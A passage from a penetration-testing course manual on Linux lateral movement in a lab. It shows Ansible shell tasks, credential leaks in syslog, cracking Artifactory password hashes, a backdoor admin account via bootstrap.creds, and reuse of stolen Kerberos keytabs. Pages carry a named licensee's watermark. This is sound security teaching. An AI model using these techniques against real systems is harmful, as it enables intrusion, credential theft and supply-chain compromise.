Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by 
applicable law. 
 
root@linuxvictim:~#  
Listing 685 - Logging in as root with our Kali VM’s SSH key 
There may be a situation where we want to run shell commands directly on the machine. To do 
this, we insert the commands we want to run in a command852 Ansible task in the 
getinfowritable.yaml playbook we used earlier. 
    - name: Run command 
      shell: touch /tmp/mycreatedfile.txt 
      async: 10 
      poll: 0 
Listing 686 - Running our shell command as a command task 
There are a few unfamiliar options here: async, poll, and shell. Typically, when an Ansible playbook 
is run, it “blocks” or waits for a response to report back to the controller.853 If we specify the async 
parameter with any timeout value, the command will run asynchronously. The timeout value is 
disregarded because the poll setting of 0 makes the async value irrelevant. This tells Ansible not 
to poll the process for results but just let it run on its own until the execution of the playbook is 
complete. 
The shell value specifies the shell command we want to run. 
If we run the playbook as before, then check the /tmp directory on the linuxvictim host, we notice 
that the command was run successfully. 
offsec@linuxvictim:~$ ls -al /tmp/mycreatedfile.txt 
-rw-r--r-- 1 root root 0 Sep 24 14:05 /tmp/mycreatedfile.txt 
Listing 687 - Our shell command executed successfully 
14.2.7 
Sensitive Data Leakage via Ansible Modules 
Another way that Ansible can be useful for lateral movement is through sensitive data leaks. 
Although there are protections for credentials and sensitive data being used in module 
parameters in Ansible playbooks, some modules leak data to /var/log/syslog854 in the form of 
module parameters. This happens when the set of a module’s parameters are not fixed and can 
potentially change depending on how the module is being run. 
A good example of this is the shell855 Ansible module. Let’s imagine a scenario where an Ansible 
administrator wants to run a playbook on a managed node to make a database backup from a 
remote server. An example playbook might look something like this. 
 
852 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/modules/command_module.html 
853 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/user_guide/playbooks_async.html 
854 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Syslog 
855 (Red Hat, Inc., 2020), https://docs.ansible.com/ansible/latest/modules/shell_module.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
552 
ansibleadm@controller:/opt/playbooks$ cat mysqlbackup.yml  
--- 
- name: Backup TPS reports 
  hosts: linuxvictim 
  gather_facts: true 
  become: yes 
  tasks: 
    - name: Run command 
      shell: mysql --user=root --password=hotdog123 --host=databaseserver --databases 
tpsreports --result-file=/root/reportsbackup 
      async: 10  
      poll: 0 
Listing 688 - Shell module playbook example 
The shell line above shows that the playbook will attempt to connect to a server called 
databaseserver (in our case, this server doesn’t exist but is used for illustration purposes) and 
dump the tpsreports database to a file on the linuxvictim Ansible node. 
In this case, because the process is automated and will run frequently, the administrator placed 
the username and password directly into the playbook. 
It should be clear to us by now why this is bad practice. System administrators sometimes 
consider plain text password inclusion to be “safe enough” in a context like this one, because the 
script is readable only for the Ansible administrator user and root. 
When the Ansible administrator runs the playbook on the node (our linuxvictim machine), it 
attempts to connect to the MySQL server and dump the database. However, because of how it is 
executed, the playbook will log the shell command to syslog by default. An exception to this is 
when the no_log option is set to true in the playbook. 
It can be useful to grep the /var/log/syslog file for keywords like “password” to 
find these sorts of leaked secrets. 
Let’s log in to the linuxvictim host as offsec and examine the contents of /var/log/syslog. 
offsec@linuxvictim:~$ cat /var/log/syslog 
... 
Jun  8 13:29:10 linuxvictim ansible-command: Invoked with creates=None executable=None 
_uses_shell=True strip_empty_ends=True _raw_params=mysql --user=root --
password=hotdog123 --host=databaseserver --databases tpsreports --result-
file=/root/reportsbackup removes=None argv=None warn=True chdir=None 
stdin_add_newline=True stdin=None 
Jun  8 13:29:10 linuxvictim ansible-async_wrapper.py: Module complete (21772) 
... 
Listing 689 - Examining Syslog 
The username, password, and host for the MySQL database are all exposed in the log entry. With 
this information, we now have access to the MySQL database on the remote server. We can 
gather more sensitive information and potentially pivot to that host as well. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
553 
While these techniques won’t work in every Ansible infrastructure instance, they can provide 
some guidance in what to look for when we encounter automated IT configuration engines during 
a penetration test. 
14.2.7.1 Exercises 
1. 
Execute an ad-hoc command from the controller against the linuxvictim host. 
2. 
Write a short playbook and run it against the linuxvictim host to get a reverse shell. 
3. 
Inject a shell command task into the getinfowritable.yml playbook we created earlier and use 
it to get a Meterpreter shell on the linuxvictim host without first copying the shell to the 
linuxvictim host via SSH or other protocols. 
14.2.8 
Introduction to Artifactory 
Artifactory856 is a “binary repository manager” that stores software packages and other binaries. 
Other binary repository managers include Apache Archiva,857 SonaType Nexus,858 CloudRepo,859 
or Cloudsmith.860 As with Ansible for DevOps, we’ll focus only on Artifactory as we’ve encountered 
it frequently during penetration testing engagements. Most of the time, the same general 
concepts explained in this section can be applied to different products. 
Binary repository managers act as a “single source of truth” for organizations to be able to control 
which versions of packages and applications are being used in software development or 
infrastructure configuration. This prevents developers from getting untrusted or unstable binaries 
directly from the Internet. 
Users with write access to Artifactory can place packages or binaries in the Artifactory server. 
End users or automated processes can have Artifactory configured as a package repository to be 
used in a normal installation process on Linux or can pull files directly from Artifactory when 
needed. 
Because Artifactory is meant to be a single source for acquiring necessary binaries, it is a prime 
target for supply chain compromise attacks.861 If an attacker can compromise the Artifactory 
server or get access to an Artifactory user’s account that has write access to important 
packages, there is potential to compromise a large number of users. 
Artifactory is also an excellent target because it is considered a trusted source. As such, there is 
less concern on the part of the users about the potential for malicious activity. 
Normally, Artifactory would be run on a production system as a service. Unfortunately, the service 
is resource-intensive. To conserve resources for other activities in the module, we’ll start and stop 
it as needed and run it as a daemon process only. 
 
856 (JFrog Ltd., 2020), https://jfrog.com/artifactory/ 
857 (Apache Software Foundation, 2020), http://archiva.apache.org/index.cgi 
858 (Sonatype Inc., 2020), https://www.sonatype.com/nexus/repository-pro 
859 (CloudRepo, 2020), https://www.cloudrepo.io 
860 (Cloudsmith, 2020), https://cloudsmith.com 
861 (The MITRE Corporation, 2020), https://attack.mitre.org/techniques/T1195/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
554 
The open-source version of Artifactory is installed on the controller VM in the /opt/jfrog directory. 
We can run it as a daemon process through the artifactoryctl start command. 
offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start 
2020-06-01T14:24:17.138Z [shell] [INFO ] [] [installerCommon.sh:1162       ] [main] - 
Checking open files and processes limits 
2020-06-01T14:24:17.157Z [shell] [INFO ] [] [installerCommon.sh:1165       ] [main] - 
Current max open files is 1024 
... 
Using JRE_HOME:        /opt/jfrog/artifactory/app/third-party/java 
Using CLASSPATH:       
/opt/jfrog/artifactory/app/artifactory/tomcat/bin/bootstrap.jar:/opt/jfrog/artifactory
/app/artifactory/tomcat/bin/tomcat-juli.jar 
Using CATALINA_PID:    /opt/jfrog/artifactory/app/run/artifactory.pid 
Tomcat started. 
Listing 690 - Starting the Artifactory process 
It’s possible to stop the service using the following command: sudo 
/opt/jfrog/artifactory/app/bin/artifactoryctl stop 
Let’s take a few moments to become familiar with Artifactory and how it works before we begin 
our attack. We can access the login page at http://controller:8082/ and log in with “admin” as the 
username and “password123” as the password. 
 
Figure 238: Initial Artifactory login 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
555 
 
While the commercial version of Artifactory supports a variety of repository types (including 
Debian packages), the open-source version is limited. The version of Artifactory we’re using only 
offers Gradle,862 Ivy,863 Maven,864 SBT,865 and Generic repository types. 
Gradle, Maven, and SBT are all software build systems or tools and Ivy is a dependency manager 
for software builds. The Generic repository is for generic binaries of a non-specified type, 
essentially a simple file store. 
In the lab environment, we can examine a generic repository called “generic-local”. 
We can access it by clicking to Artifactory > Artifacts on the left sidebar. 
 
Figure 239: Navigating to the generic repository 
The Set Me Up button at the top right of the page gives information about how to use Curl to 
upload and download binaries to the repository. 
There is also a Deploy button that will let us upload files to the repository and specify the paths 
we want users to access to download them. 
Both the Set me Up and Deploy buttons are highlighted in Figure 240. 
 
862 (Gradle Inc., 2020), https://gradle.org 
863 (Apache Software Foundation, 2019), https://ant.apache.org/ivy/ 
864 (Apache Software Foundation, 2020), https://maven.apache.org 
865 (Lightbend, Inc., 2020), https://www.scala-sbt.org 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
556 
 
Figure 240: Set Me Up and Deploy options 
Clicking on generic-local expands the tree where we find a “vi” artifact listed. If we click on it, we 
can inspect various statistics about the file, such as the download path, who it was deployed by, 
when it was created and last modified, and how many times it’s been downloaded. 
 
Figure 241: A binary in our repository 
Now that we have a working knowledge of Artifactory, its interface, and how to use it, let’s take a 
look at potential exploits. 
14.2.9 
Artifactory Enumeration 
It’s fairly easy to determine whether an Artifactory repository is running on a target system. We 
can simply grep the list of running processes for the word “artifactory” with ps aux | grep 
artifactory. This will give a number of results including paths to the Artifactory service’s 
binaries. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
557 
If we’ve not yet gained access to the machine, we can try accessing the server externally from a 
web browser at port 8081, which is the default port for Artifactory’s web interface. 
14.2.10 
Compromising Artifactory Backups 
Even if we can get root access to the repository server, that doesn’t necessarily mean we have 
access to the Artifactory application, which has its own authentication mechanism. 
Let’s explore a situation in which we have root access to the server, but we do not have 
Artifactory credentials. 
At first glance, it may seem logical to try and replace artifact binaries on disk wherever they are 
stored. However, it is difficult to identify the files we want because they are not stored by name, 
but by their file hash. 
root@controller:/opt/jfrog/artifactory/var/data/artifactory/filestore/37# ls -al 
total 2624 
drwxr-x--- 2 root root    4096 Jun  9 11:18 . 
drwxr-x--- 4 root root    4096 Jun  9 11:18 .. 
-rw-r----- 1 root root 2675336 Jun  9 11:18 37125c1c4847ee56d5aaa2651c825cc3c2c781c5 
Listing 691 - Artifact binaries stored by hash 
Additionally, if we replace the binary on disk with something else and then log into Artifactory and 
retrieve it, we notice that the file is not changed in the repository, so there are other mechanisms 
in place to maintain file integrity. 
Replacing the binaries doesn’t seem like a viable option at this time. Let’s examine a different 
approach. 
Artifactory stores its user information, such as usernames and encrypted passwords, in 
databases as most applications do. The database depends on the configuration and version of 
Artifactory. 
Larger organizations with a commercial version of Artifactory may use Postgres databases. The 
open-source version of Artifactory defaults to an included Apache Derby866 database. This doesn’t 
necessarily represent all potential configurations, but the general concepts needed for this exploit 
are essentially the same regardless of which database is being used. 
We have two options to use the database to compromise Artifactory. The first is through 
backups. Depending on the configuration,867 Artifactory creates backups of its databases. The 
open-source version of Artifactory creates database backups for the user accounts at 
/<ARTIFACTORY FOLDER>/var/backup/access in JSON format. 
We can inspect the user entries by reading the contents of one of these files in the controller VM. 
root@controller:/opt/jfrog/artifactory/var/backup/access# cat 
access.backup.20200730120454.json 
... 
{ 
 
866 (Apache Software Foundation, 2020), https://db.apache.org/derby/ 
867 (JFrog Ltd., 2020), https://www.jfrog.com/confluence/display/JFROG/Backups 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
558 
    "username" : "developer", 
    "firstName" : null, 
    "lastName" : null, 
    "email" : "developer@corp.local", 
    "realm" : "internal", 
    "status" : "enabled", 
    "lastLoginTime" : 0, 
    "lastLoginIp" : null, 
    "password" : 
"bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm", 
    "allowedIps" : [ "*" ], 
    "created" : 1591715957889, 
    "modified" : 1591715957889, 
    "failedLoginAttempts" : 0, 
    "statusLastModified" : 1591715957889, 
    "passwordLastModified" : 1591715957889, 
    "customData" : { 
      "updatable_profile" : { 
        "value" : "true", 
        "sensitive" : false 
      } 
... 
Listing 692 - Contents of a database backup file 
These files have full entries for each user along with their passwords hashed in bcrypt868 format. 
We can copy the bcrypt hashes to our Kali VM, place them in a text file, and use John the Ripper 
(or Hashcat) to try and crack them. 
kali@kali:~$ sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8 
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) 
Cost 1 (iteration count) is 256 for all loaded hashes 
Will run 4 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
password123      (?) 
... 
Listing 693 - Cracking the database backup’s hashes 
According to the output, JTR was able to crack the hash and we retrieved the developer user’s 
password. 
14.2.11 
Compromising Artifactory’s Database 
Now that we know how to retrieve user credentials from backup files, let’s explore a different 
vector. If there are no backup files available, we can access the database itself or attempt to copy 
it and extract the hashes manually. As we mentioned previously, this would assume a scenario 
where we have elevated privileges but want to get access to Artifactory itself. 
The open-source version of Artifactory we’re using locks its Derby database while the server is 
running. We could attempt to remove the locks and access the database directly to inject users, 
 
868 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Bcrypt 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
559 
but this is risky and often leads to corrupted databases. A safer option is to copy the entire 
database to a new location. 
Third-party databases do not always have this restriction. If we can gain access 
to the database, it may be possible to create users manually by creating new 
records in the users table.869 
In the controller VM, the database containing the user information is located at 
/opt/jfrog/artifactory/var/data/access/derby. 
Let’s create a new directory and copy the database to a temporary location. 
We’ll create a temporary folder in /tmp for the database. We then copy the database from the 
original location and remove any lock files that exist from the database being in use when it was 
copied. 
offsec@controller:~$ mkdir /tmp/hackeddb 
 
offsec@controller:~$ sudo cp -r /opt/jfrog/artifactory/var/data/access/derby 
/tmp/hackeddb 
 
offsec@controller:~$ sudo chmod 755 /tmp/hackeddb/derby 
 
offsec@controller:~$ sudo rm /tmp/hackeddb/derby/*.lck 
Listing 694 - Copying the database 
Since Artifactory is using Derby as its default database, we’ll need Apache’s Derby tools to be able 
to connect to it. More specifically, the ij command line tool, which allows the user to access a 
Derby database and perform queries against it. The Derby tools are already installed on the 
controller at /opt/derby, but they can also be downloaded870 if necessary. 
Fortunately for us, the default database does not require a username and password and relies on 
file permissions to protect it. Because we have root privileges, we can connect without problems. 
Artifactory contains its own version of Java and we can use it to run the Derby connection utilities 
and connect to our database. 
offsec@controller:~$ sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar 
/opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij 
ij version 10.15 
ij> connect 'jdbc:derby:/tmp/hackeddb/derby';  
ij> 
Listing 695 - Running the Derby connection utility 
 
869 (JFrog Ltd., 2020), https://www.jfrog.com/confluence/display/JFROG/PostgreSQL 
870 (Wikipedia, 2020), http://db.apache.org/derby/releases/release-10.15.1.3.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
560 
The first part of the command calls the embedded version of Java included as part of Artifactory. 
We’re specifying that we want to run the derbyrun.jar JAR file. The ij parameter indicates that we 
want to use Apache’s ij871 tool to access the database. 
The utility presents us with a simple prompt. It uses SQL syntax commands to manipulate the 
database. We will run the following command to list the users in the system. 
ij> select * from access_users; 
USER_ID |USERNAME |PASSWORD |ALLOWED_IPS |CREATED |MODIFIED |FIRSTNAME |LASTNAME 
|EMAIL |REALM |STATUS |LAST_LOGIN_TIME |LAST_LOGIN_IP |FAILED_ATTEMPTS 
|STATUS_LAST_MODIFIED| PASSWORD_LAST_MODIF& 
... 
1 |admin |bcrypt$$2a$08$3gNs9Gm4wqY5ic/2/kFUn.S/zYffSCMaGpshXj/f/X0EMK.ErHdp2 
|127.0.0.1 |1591715727140 |1591715811546 |NULL |NULL |NULL |internal |enabled 
|1596125074382 |192.168.118.5 |0 |1591715811545 |1591715811545        
...     
3 |developer |bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm |* 
|1591715957889 |1591715957889 |NULL |NULL |developer@corp.local |internal |enabled |0 
|NULL |0 |1591715957889 |1591715957889        
 
3 rows selected 
ij>  
Listing 696 - Listing the users 
The command selects all records from the access_users table, which holds the user records for 
the Artifactory system. 
Each record includes the bcrypt-hashed passwords of the users we found earlier in our database 
backup file approach. As we did previously, we can crack the hashes using Hashcat or John the 
Ripper on our Kali VM. 
14.2.12 
Adding a Secondary Artifactory Admin Account 
In addition to the vectors we’ve already explored, we can also gain access to Artifactory by adding 
a secondary administrator account through a built-in backdoor. If an administrator account is 
corrupted, or they lose access to the system, Artifactory offers an alternative option for gaining 
administrative access. This method will require restarting the Artifactory process, meaning there 
is some risk of data corruption or production downtime. As a result, this may not be an 
appropriate solution for all engagements. 
This method requires write access to the /opt/jfrog/artifactory/var/etc/access folder and the 
ability to change permissions on the newly-created file, which usually requires root or sudo 
access. 
To demonstrate this method, we’ll log in to the controller server as offsec and navigate to the 
/opt/jfrog/artifactory/var/etc/access folder. We then need to create a file through sudo called 
bootstrap.creds with the following content. 
haxmin@*=haxhaxhax 
Listing 697 - Adding backdoor admin account 
 
871 (Apache Software Foundation, 2013), https://db.apache.org/derby/docs/10.15/getstart/tgsrunningij.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
561 
This will create a new user called “haxmin” with a password of “haxhaxhax”. Next, we’ll need to 
chmod the file to 600. 
offsec@controller:/opt/jfrog$ sudo chmod 600 
/opt/jfrog/artifactory/var/etc/access/bootstrap.creds 
Listing 698 - Changing the file permissions 
For this user to be created, we need to restart the Artifactory process. Because Artifactory is 
being run as a daemon process, we can stop it and then restart it using the following commands. 
offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop 
Using the default catalina management port (8015) to test shutdown 
Stopping Artifactory Tomcat... 
... 
router is running (PID: 12434). Stopping it... 
router stopped 
 
offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start 
2020-06-01T14:38:16.769Z [shell] [INFO ] [] [installerCommon.sh:1162       ] [main] - 
Checking open files and processes limits 
2020-06-01T14:38:16.785Z [shell] [INFO ] [] [installerCommon.sh:1165       ] [main] - 
Current max open files is 1024 
... 
Using CATALINA_PID:    /opt/jfrog/artifactory/app/run/artifactory.pid 
Tomcat started. 
Listing 699 - Restarting the Artifactory process 
During the restart stage, Artifactory will load our bootstrap credential file and process the new 
user. We can verify this by examining the /opt/jfrog/artifactory/var/log/console.log file for the 
string “Create admin user”. 
offsec@controller:~$ sudo grep "Create admin user" 
/opt/jfrog/artifactory/var/log/console.log 
2020-05-15T19:22:24.963Z [jfac ] [INFO ] [c576b641d3d536c8] 
[a.s.b.AccessAdminBootstrap:160] [ocalhost-startStop-2] - [ACCESS BOOTSTRAP] Create 
admin user 'haxmin' 
Listing 700 - Successfully added our new admin user 
Once Artifactory is running again, we can log in with our newly-created account. 
 
Figure 242: Logged in as haxmin 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
562 
 
We now have admin access to Artifactory and can modify binaries as we see fit. 
In a real-world scenario, if the user was using Artifactory as a repository, running an update on 
their local system would trigger a download of the updated binary. The next time the binary is run 
by the user, they would be compromised. The same would occur if Artifactory was being used as 
a simple file store for shared binary files. Any subsequent downloads of our updated file would 
result in the user being compromised. 
Artifactory is an excellent option for compromising many targets in a single effort and can help to 
expand access significantly within an internal network. 
14.2.12.1 
Exercises 
1. 
Copy the Artifactory database and extract, then crack, the user hashes. 
2. 
Log in to Artifactory and deploy a backdoored binary. Download and run it as a normal user 
on linuxvictim. 
14.3 Kerberos on Linux 
Kerberos uses the same underlying technology on Linux as it does on Windows, but it does 
behave differently in some respects. In the next section, we’ll explore how Kerberos works on 
Linux, and how to exploit it. 
14.3.1 
General Introduction to Kerberos on Linux 
Kerberos is a well-known option for authentication on Windows networks, but it can also be used 
on Linux networks using Linux-specific Key Distribution Center servers. Alternatively, Linux clients 
can authenticate to Active Directory servers via Kerberos as a Windows machine would. Let’s 
explore this scenario in this section. 
As before, we’ll begin by demonstrating standard Kerberos usage. This demonstration will help us 
understand potential exploits. 
In our lab setup, the linuxvictim lab machine is domain joined to corp1.com. Active Directory 
users can log in to the linuxvictim machine with their Active Directory credentials. 
Let’s imagine a scenario in which the corp1.com domain admin logs in to our linuxvictim host 
using their AD password. In order to use Kerberos, the administrator can log in to the system 
using their AD credentials and then request Kerberos tickets. 
Although a Domain Administrator would likely be doing these actions from a Windows machine, 
for simplicity, we will log in to the linuxvictim system from our Kali VM. 
kali@kali:~$ ssh administrator@corp1.com@linuxvictim 
administrator@corp1.com@linuxvictim's password:  
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64) 
... 
Last login: Thu May  7 10:14:24 2020 from 192.168.119.120 
administrator@corp1.com@linuxvictim:~$  
Listing 701 - SSH connection to linuxvictim using AD credentials 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
563 
Active Directory members using Kerberos authentication are assigned a credential cache file to 
contain their requested Kerberos tickets. The file’s location is set through the user’s 
KRB5CCNAME872 environment variable. 
In the linuxvictim VM, we can find the administrator’s credential cache file by examining the list of 
environment variables with env and filtering out the one we want with grep. 
administrator@corp1.com@linuxvictim:~$ env | grep KRB5CCNAME 
KRB5CCNAME=FILE:/tmp/krb5cc_607000500_3aeIA5 
Listing 702 - Credential cache file path environment variable 
We’ll make a note of this credential cache file location for later use. 
Kerberos tickets expire after a period of time. As a result, in order to practice exploiting them, we’ll 
walk through how to request them from the server using an Active Directory account. We’ll use 
the domain administrator account we logged in with earlier. 
We will use the kinit873 command, which is used to acquire a Kerberos ticket-granting ticket (TGT) 
for the current user. To request a TGT, we just need to call kinit without parameters and enter 
the user’s AD password. 
administrator@corp1.com@linuxvictim:~$ kinit 
 
Password for Administrator@CORP1.COM:  
Listing 703 - Getting a TGT 
The klist874 command is used to list tickets currently stored in the user’s credential cache file. If 
we run it, we find that we now have our TGT set in the Administrator user’s credential cache. 
administrator@corp1.com@linuxvictim:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_607000500_wSiMnP 
Default principal: Administrator@CORP1.COM 
 
Valid starting       Expires              Service principal 
05/18/2020 15:12:38  05/19/2020 01:12:38  krbtgt/CORP1.COM@CORP1.COM 
    renew until 05/25/2020 15:12:36 
Listing 704 - Listing current tickets in the user’s cache 
This means we have a ticket-granting ticket for the Administrator user of the CORP1 domain. 
If we want to discard all cached tickets for the current user, we can use the 
kdestroy875 command without parameters. 
 
872 (die.net), https://linux.die.net/man/1/kerberos 
873 (die.net), https://linux.die.net/man/1/kinit 
874 (die.net), https://linux.die.net/man/1/klist 
875 (die.net), https://linux.die.net/man/1/kdestroy 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
564 
We can now access Kerberos services as the domain administrator. We can get a list of available 
Service Principal Names (SPN) from the domain controller using ldapsearch with the -Y GSSAPI 
parameter to force it to use Kerberos authentication. It may ask for an LDAP password, but if we 
just hit enter at the prompt, it will continue and use Kerberos for authentication. 
administrator@corp1.com@linuxvictim:~$ ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -
D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" 
servicePrincipalName 
Enter LDAP Password:  
SASL/GSSAPI authentication started 
SASL username: Administrator@CORP1.COM 
... 
# DC01, Domain Controllers, corp1.com 
dn: CN=DC01,OU=Domain Controllers,DC=corp1,DC=com 
servicePrincipalName: TERMSRV/DC01 
servicePrincipalName: TERMSRV/DC01.corp1.com 
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.corp1.com 
servicePrincipalName: ldap/DC01.corp1.com/ForestDnsZones.corp1.com 
servicePrincipalName: ldap/DC01.corp1.com/DomainDnsZones.corp1.com 
servicePrincipalName: DNS/DC01.corp1.com 
servicePrincipalName: GC/DC01.corp1.com/corp1.com 
servicePrincipalName: RestrictedKrbHost/DC01.corp1.com 
servicePrincipalName: RestrictedKrbHost/DC01 
servicePrincipalName: RPC/8c186ffa-f4e6-4c8a-9ea9-67ca49c31abd._msdcs.corp1.co 
 m 
... 
# SQLSvc, Corp1ServiceAccounts, Corp1Users, corp1.com 
dn: CN=SQLSvc,OU=Corp1ServiceAccounts,OU=Corp1Users,DC=corp1,DC=com 
servicePrincipalName: MSSQLSvc/DC01.corp1.com:1433 
servicePrincipalName: MSSQLSvc/DC01.corp1.com:SQLEXPRESS 
servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:1433 
servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS 
... 
# numResponses: 10 
# numEntries: 6 
# numReferences: 3 
Listing 705 - List SPNs available using Kerberos authentication 
Let’s request a service ticket from Kerberos for the MSSQL SPN highlighted above. We can do 
this using the kvno utility. 
administrator@corp1.com@linuxvictim:/tmp$ kvno MSSQLSvc/DC01.corp1.com:1433 
MSSQLSvc/DC01.corp1.com:1433@CORP1.COM: kvno = 2 
Listing 706 - Getting a service ticket 
Our ticket should now be in our credential cache. We can use klist again to confirm it was 
successful. 
administrator@corp1.com@linuxvictim:/tmp$ klist 
Ticket cache: FILE:/tmp/krb5cc_607000500_3aeIA5 
Default principal: Administrator@CORP1.COM 
 
Valid starting       Expires              Service principal 
07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM 
        renew until 08/06/2020 15:11:08 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
565 
07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM 
        renew until 08/06/2020 15:11:08 
07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM 
        renew until 08/06/2020 15:11:08 
Listing 707 - Service ticket was acquired successfully 
We can now access the MSSQL service and perform authenticated actions. 
Now that we’ve covered how Kerberos works in legitimate scenarios, let’s discuss a few attack 
vectors. We’ll discuss a few scenarios and then how to exploit them. 
14.3.2 
Stealing Keytab Files 
One way to allow automated scripts to access Kerberos-enabled network resources on a user’s 
behalf is through the use of keytab876 files. Keytab files contain a Kerberos principal name and 
encrypted keys. These allow a user or script to authenticate to Kerberos resources elsewhere on 
the network on the principal’s behalf without entering a password. 
For example, let’s assume a user wants to retrieve data from an MSSQL database via an 
automated script using Kerberos authentication.The user could create a keytab file for the script 
to authenticate against the server with their credentials and then retrieve the information on their 
behalf. 
Keytab files are commonly used in cron877 scripts when Kerberos authentication is needed to 
access certain resources. We can examine the contents of files like /etc/crontab to determine 
which scripts are being run and then examine those scripts to see whether they are using keytabs 
for authentication. Paths to keytab files used in these scripts may also reveal which users are 
associated with which keytabs. 
Let’s create a sample demonstration keytab for our domain Administrator. 
We’ll run the ktutil878 command, which provides us with an interactive prompt. Then we use 
addent to add an entry to the keytab file for the administrator user and specify the encryption 
type with -e. The utility asks for the user’s password, which we provide. We then use wkt with a 
path to specify where the keytab file should be written. Finally, we can exit the utility with the quit 
command. 
administrator@corp1.com@linuxvictim:~$ ktutil 
ktutil:  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac 
Password for administrator@CORP1.COM:  
 
ktutil:  wkt /tmp/administrator.keytab 
 
ktutil:  quit 
Listing 708 - Creating a keytab file 
This will write the keytab file to /tmp/administrator.keytab. 
 
876 (MIT, 2020), https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html 
877 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Cron 
878 (MIT, 2015), https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/ktutil.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
566 
This keytab file grants domain administrator rights to scripts or users that have read access to it. 
However, let’s imagine a scenario where we’ve gotten root access to this box. If we discover the 
keytab file, we can use it maliciously to gain access to other systems as the domain 
administrator. To use the file in a script run by the root user, we will use the following syntax. 
root@linuxvictim:~# kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab 
Listing 709 - Loading a keytab file 
Using the klist command, we can verify that the tickets from the keytab have been loaded into 
our root account’s credential cache file. 
root@linuxvictim:~# klist 
Ticket cache: FILE:/tmp/krb5cc_1000 
Default principal: administrator@CORP1.COM 
 
Valid starting       Expires              Service principal 
07/30/2020 15:18:34  07/31/2020 01:18:34  krbtgt/CORP1.COM@CORP1.COM 
        renew until 08/06/2020 15:18:34 
Listing 710 - Viewing our loaded TGT file from the keytab 
If it’s been a while since the tickets were created, they may have expired. However, if it’s within the 
renewal timeframe, we can renew it without entering a password using kinit with the -R flag. 
root@linuxvictim:~# kinit -R 
Listing 711 - Renewing an expired TGT 
